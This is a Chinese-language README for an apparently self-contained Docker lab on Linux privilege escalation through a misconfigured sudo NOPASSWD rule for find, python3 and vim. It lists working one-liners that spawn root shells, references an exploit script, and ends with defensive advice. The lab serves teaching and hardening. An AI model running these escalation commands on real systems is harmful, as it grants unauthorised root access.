# sudo NOPASSWD 危险命令提权

## 原理

sudo 允许普通用户以 root 身份执行命令。当管理员在 /etc/sudoers 中错误地配置了
`NOPASSWD` 且放开了 find、python、vim 这类**可以执行外部命令**的程序时，
普通用户就能借这些程序以 root（euid=0）执行任意命令，直接提权。

关键点：find 的 -exec 参数、python 的 os.setuid(0)、vim 的 python 接口，
都在 root 权限的进程内执行。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/etc/sudoers.d/lowpriv 中 `lowpriv ALL=(ALL:ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim`

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 查看被授权的 sudo 命令
sudo -l
# 预期输出:
#     (ALL : ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim

# 4. find 提权 (核心: -exec 以 root 执行, sh -p 保留 euid)
sudo find / -exec /bin/sh -p -c 'id' \; -quit
# 预期输出: uid=0(root) gid=0(root) groups=0(root)

# 5. python3 提权 (os.setuid(0) 把进程 uid 改为 0)
sudo python3 -c 'import os; os.setuid(0); os.system("id")'
# 预期输出: uid=0(root) gid=0(root)

# 6. vim 提权 (vim 带 +python3 时)
sudo vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
# 预期输出: # (root shell)

# 7. 一键利用
bash exploit.sh
```

## 为什么能成功

| 命令 | 原理 |
|:---|:---|
| find | `-exec` 参数允许执行任意命令，find 以 euid=0 运行，`/bin/sh -p` 的 -p 参数让 shell 保留有效用户 ID 不降权 |
| python3 | `os.setuid(0)` 直接修改进程真实 UID 为 0 |
| vim | vim 的 `:py3` 接口在 vim 进程（euid=0）内执行 Python |

## 防御

- 遵循最小权限原则，不放开 find/python/vim 等危险命令的 NOPASSWD
- 定期审计 `sudo -l` 与 /etc/sudoers
- 参考 GTFOBins（https://gtfobins.github.io）排查常见提权命令

## 验证记录

2026-08-26 在真实环境验证：`sudo find / -exec /bin/sh -p -c 'id' \; -quit` 输出 `uid=0(root)`，复现成功。
